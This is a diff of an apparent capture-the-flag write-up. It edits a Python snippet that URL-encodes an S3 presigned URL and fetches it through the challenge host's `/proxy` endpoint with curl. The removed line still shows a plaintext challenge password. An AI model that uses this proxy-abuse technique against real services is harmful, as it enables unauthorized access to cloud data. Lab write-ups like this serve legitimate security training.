@@ -122,7 +122,7 @@ By routing the presigned URL request through the `/proxy` endpoint on the EC2 in
 **Critical gotcha:** The presigned URL contains `&` characters, which would be interpreted as additional query parameters if passed raw to `/proxy?url=...`. The entire presigned URL must be **URL-encoded** before use.
 
 ```python
-import boto3, urllib.parse, subprocess
+import boto3, os, urllib.parse, subprocess
 
 s3 = boto3.client('s3',
     region_name='us-east-1',
@@ -143,7 +143,7 @@ encoded = urllib.parse.quote(presigned, safe='')
 proxy_url = f"https://challenge01.cloud-champions.com/proxy?url={encoded}"
 
 result = subprocess.run(
-    ['curl', '-s', '-u', 'ctf:88sPVWyC2P3p', proxy_url],
+  ['curl', '-s', '-u', f'ctf:{os.environ["CTF_PASSWORD"]}', proxy_url],
     capture_output=True, text=True
 )
 print(result.stdout)
